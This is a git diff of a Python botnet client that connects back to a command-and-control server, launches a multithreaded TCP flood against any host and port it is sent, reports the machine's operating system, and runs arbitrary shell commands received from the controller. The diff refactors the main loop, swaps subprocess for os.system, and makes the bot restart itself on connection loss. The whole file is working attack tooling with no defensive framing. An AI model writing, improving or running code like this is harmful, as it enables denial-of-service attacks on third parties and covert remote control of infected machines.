@@ -1,11 +1,11 @@
 import socket
 import threading
 import time
-import subprocess
 import platform
+import os
 
 
-host = "192.168.1.163"
+host = "192.168.1.182"
 port = 2121
 
 bot_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -22,102 +22,97 @@ def connecting():
             continue
 
 
-connecting()
+def main():
+    while True:
+        try:
+            cmd = bot_socket.recv(1024).decode("utf-8")
 
-while True:
-    try:
-        cmd = bot_socket.recv(1024).decode("utf-8")
+            # run Dos attack
+            if cmd.split(" ")[0] == "use" and cmd.split(" ")[1] == "-dos":
 
-        # run Dos attack
-        if cmd.split(" ")[0] == "use" and cmd.split(" ")[1] == "-dos":
+                class Dos:
 
-            class Dos:
+                    def __init__(self, host, port, nThreads):
+                        self.host = host
+                        self.port = port
+                        self.nThreads = nThreads
 
-                def __init__(self, host, port, nThreads):
-                    self.host = host
-                    self.port = port
-                    self.nThreads = nThreads
+                        self.threadslist = []
 
-                    self.threadslist = []
+                        self.message = "SCHOKOLADE" + "genau so lecker wie M&Ms" + "HTTP//1.1.1.1\n\r"
 
-                    self.message = "SCHOKOLADE" + "genau so lecker wie M&Ms" + "HTTP//1.1.1.1\n\r"
+                    def SendAttack(self):
+                        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-                def SendAttack(self):
-                    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-                    try:
-                        client_socket.connect((self.host, int(self.port)))
-                        client_socket.send(str.encode(self.message))
-                        client_socket.sendto(str.encode(self.message), (self.host, int(self.port)))
-                        print("working")
-
-                    except socket.error:
-                        print("error")
-
-                    client_socket.close()
-
-                def Attack(self):
-                    for i in range(int(self.nThreads)):
-                        t = threading.Thread(target=self.SendAttack)
-                        self.threadslist.append(t)
-
-                    for i in self.threadslist:
                         try:
-                            i.start()
+                            client_socket.connect((self.host, int(self.port)))
+                            client_socket.send(str.encode(self.message))
+                            client_socket.sendto(str.encode(self.message), (self.host, int(self.port)))
+                            print("working")
 
-                        except RuntimeError:
-                            continue
+                        except socket.error:
+                            print("error")
 
-                    for i in self.threadslist:
-                        try:
-                            i.join()
+                        client_socket.close()
 
-                        except RuntimeError:
-                            continue
+                    def Attack(self):
+                        for i in range(int(self.nThreads)):
+                            t = threading.Thread(target=self.SendAttack)
+                            self.threadslist.append(t)
 
+                        for i in self.threadslist:
+                            try:
+                                i.start()
 
-            host = cmd.split(" ")[2]
-            port = cmd.split(" ")[3]
-            nThreads = cmd.split(" ")[4]
+                            except RuntimeError:
+                                continue
 
-            Dos = Dos(host, port, nThreads)
+                        for i in self.threadslist:
+                            try:
+                                i.join()
 
-            bot_socket.send("[*] Starting Attack...".encode())
+                            except RuntimeError:
+                                continue
 
-            Dos.Attack()
+                host = cmd.split(" ")[2]
+                port = cmd.split(" ")[3]
+                nThreads = cmd.split(" ")[4]
 
-            bot_socket.send(("[*] The Attack was done at " + time.strftime("%H:%M:%S")).encode())
-            continue
+                Dos = Dos(host, port, nThreads)
 
-        # test connection
-        elif cmd == "connection test":
-            try:
-                bot_socket.send("[*] Connection online".encode())
+                bot_socket.send("[*] Starting Attack...".encode())
 
-            except socket.error:
-                bot_socket.close()
-                exit()
+                Dos.Attack()
 
-            continue
-
-        # operating system information
-        elif cmd == "os":
-            bot_socket.send(platform.system().encode())
-            continue
-
-        # make command in shell window
-        else:
-            comm = subprocess.Popen(str(cmd), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-            STDOUT, STDERR = comm.communicate()
-
-            if not STDOUT:
-                bot_socket.send(STDERR)
+                bot_socket.send(("[*] The Attack was done at " + time.strftime("%H:%M:%S")).encode())
                 continue
 
+            # testing connection
+            elif cmd == "ping":
+                try:
+                    bot_socket.send("PONG".encode())
+
+                except socket.error:
+                    bot_socket.close()
+                    exit()
+
+                continue
+
+            # operating system information
+            elif cmd == "os":
+                bot_socket.send(platform.system().encode())
+                continue
+
+            # make command in shell window
             else:
-                bot_socket.send(STDOUT)
-                continue
+                os.system(cmd)
+                bot_socket.send(cmd.encode())
 
-    except socket.error:
-        connecting()
-        continue
+        # connection loop
+        except socket.error:
+            os.system("python3 Bot.py")
+            exit()
+
+
+connecting()
+main()
